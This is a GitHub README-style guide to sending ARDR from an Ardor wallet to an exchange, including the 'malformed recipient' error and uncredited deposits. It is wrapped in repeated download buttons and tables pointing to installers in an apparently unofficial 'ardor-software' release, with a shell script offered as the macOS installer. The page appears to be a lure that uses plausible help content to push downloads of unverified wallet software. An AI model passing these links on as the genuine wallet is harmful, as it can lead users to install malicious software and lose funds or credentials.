![Ardor Wallet guide](assets/banner-article.png)

# Send ARDR to an exchange, clear a malformed recipient, and trace a missing deposit

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Sending ARDR to an exchange means opening the account on the passphrase tab, selecting the parent chain, pasting the exchange's deposit address, adding the memo if the exchange requires one, and confirming the fee. Two failures account for most complaints: a recipient the wallet calls malformed, and a deposit that arrived but was never credited.

## What you need before you send

Four things, and each one prevents a specific way the transfer goes wrong.

1. The account unlocked on the [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) tab. The account tab is read-only and cannot sign, so a send attempted there fails.
2. The right chain selected. ARDR lives on the parent chain; [Ignis](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md) and the others are separate ledgers with separate balances.
3. The deposit address copied from the exchange's own page for this asset, in this session.
4. A note of whether the exchange requires a message or memo field, and what it says to put there.

The fourth item is the one people skip. A transfer that needs a memo and arrives without one is credited to the exchange but not to you, and only the exchange's support process can fix it.

## Send step by step

1. Open the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and enter the passphrase, not the address.
2. Confirm the parent chain is selected and the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) is the one you expect.
3. Choose send, then paste the destination address.
4. Check the first and last groups of the address against the exchange page rather than trusting the middle.
5. Enter the amount and leave enough for the fee; the dialog can compute a current fee for you.
6. Add the memo if the exchange asked for one, then review and confirm.
7. Copy the transaction ID from the wallet's transaction list and keep it until the exchange credits the deposit.

Step seven is the step that makes a support ticket possible. Without the transaction ID, an exchange is being asked to find a transfer among thousands, and the case will wait while somebody does that by hand.

## The malformed recipient error

The wallet reports that a recipient account is malformed when the address does not pass the format check. The most common cause is not a bad address at all: it is sending ARDR from a Nxt client rather than the Ardor client. The two clients look similar and the address formats are close enough to paste, so the Nxt client rejects an Ardor address that the Ardor client would accept.

Open the same passphrase in the Ardor wallet and send from there. If the address still fails in the Ardor client, check for a truncated paste, a missing group, or characters copied from a formatted list with spaces inside the address.

## A deposit that never arrived

Work from the chain outward, because the answer is usually visible before support is involved.

| Check | What it tells you |
|---|---|
| The transaction is confirmed in your wallet | The funds left your account |
| The address matches the exchange's deposit page exactly | The destination was right |
| The memo field matches what the exchange asked for | The credit can be matched to you |
| The exchange shows the deposit as pending | It arrived and is waiting for confirmations |

If all four hold and the balance is still not credited, open a ticket with the transaction ID, the address, the amount and the exact time. Do not send a second transfer to "fix" it; a duplicate deposit is a second support case rather than a solution, and it complicates the first one.

## Fees, memos and confirmations

The fee is paid in ARDR on the parent chain, and the wallet can calculate a current figure rather than leaving you to guess. A fee set too low produces a transaction that sits unconfirmed for longer than expected, which is a delay rather than a loss.

Exchanges set their own confirmation threshold before crediting. A deposit that is confirmed on chain can still sit as pending on the exchange for a while, and that is normal rather than a sign of a problem.

The fee itself is small relative to the transfer in normal conditions, which is why choosing the cheapest possible figure is a false economy: a transaction that waits hours can cost more in missed price movement than the fee saved. Let the wallet calculate a current figure unless you have a reason not to.

## A test send worth doing

For a first withdrawal to a new exchange address, send a small amount and wait for it to be credited before moving the rest. It costs one fee and it exercises the address, the memo and the exchange's crediting path in one go.

After the test arrives, the remaining transfer is a repeat of a known-good operation rather than a guess. That is the whole value of the step, and it is why people who move funds regularly do it every single time an address or a memo requirement changes.

## FAQ

### Why does the wallet say the recipient account is malformed?

Usually because the send was attempted from a Nxt client rather than the Ardor client. Use the Ardor wallet with the same passphrase, and check the address for a truncated paste.

### Do I need a memo to send ARDR to an exchange?

Only if that exchange asks for one. Read its deposit instructions for this asset rather than assuming, because an exchange that needs a memo will not credit a transfer without it.

### How long does a send take to confirm?

It depends on the fee and on the chain's activity. A low fee can leave the transaction pending for a while; the wallet shows its state, and the funds have not moved until it confirms.

### Can I cancel a transaction after sending?

No. Once broadcast it either confirms or stays pending until it does. Check the address before confirming, because there is no reversal afterwards.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Why an Ardor transaction stays unconfirmed](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md)
- [How to buy ARDR, move it into your own wallet, and swap out](https://github.com/ardor-software/ardor-wallet-guides/blob/main/how-to-buy-ardor-and-ardr.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Why the Ardor wallet shows a zero balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
